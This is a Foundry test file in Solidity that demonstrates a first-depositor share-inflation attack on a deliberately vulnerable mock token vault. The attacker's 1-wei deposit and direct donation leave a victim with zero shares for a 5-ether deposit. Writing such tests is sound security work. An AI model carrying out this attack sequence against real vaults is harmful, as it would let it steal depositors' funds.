// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { MockERC20 } from "../../../src/mocks/tokens/MockERC20.sol";
import { VulnerableVault } from "../../../src/mocks/vaults/vulnerable/VulnerableVault.sol";

contract VulnerableVaultTest is Test {
    MockERC20 asset;
    VulnerableVault vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20();
        vault = new VulnerableVault(address(asset));
        asset.mint(attacker, 10 ether);
        asset.mint(victim, 10 ether);
        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        asset.approve(address(vault), type(uint256).max);
    }

    function test_firstDepositorInflationAttack_stealsVictimShareAllocation() public {
        // Attacker becomes the first depositor.
        vm.prank(attacker);
        vault.deposit(1, attacker);

        // Attacker artificially increases the vault's asset balance
        // without receiving any additional shares.
        vm.prank(attacker);
        asset.transfer(address(vault), 5 ether);

        // Victim deposits 5 ether.
        vm.prank(victim);
        vault.deposit(5 ether, victim);

        // Victim receives zero shares because the vulnerable vault
        // calculates shares using the vault's post-deposit asset balance.
        assertEq(vault.balanceOf(victim), 0);

        // Attacker still owns the only share.
        assertEq(vault.balanceOf(attacker), 1);

        // The vault holds the attacker's 5 ether donation,
        // the victim's 5 ether deposit, and the attacker's original 1 wei.
        assertEq(asset.balanceOf(address(vault)), 10 ether + 1);
        assertEq(vault.totalAssets(), 10 ether + 1);

        // All outstanding shares still belong to the attacker.
        assertEq(vault.totalSupply(), 1);
        assertEq(vault.balanceOf(attacker), vault.totalSupply());

        // The victim's 5 ether was transferred into the vault,
        // but the victim received no shares.
        assertEq(asset.balanceOf(victim), 5 ether);
    }
}
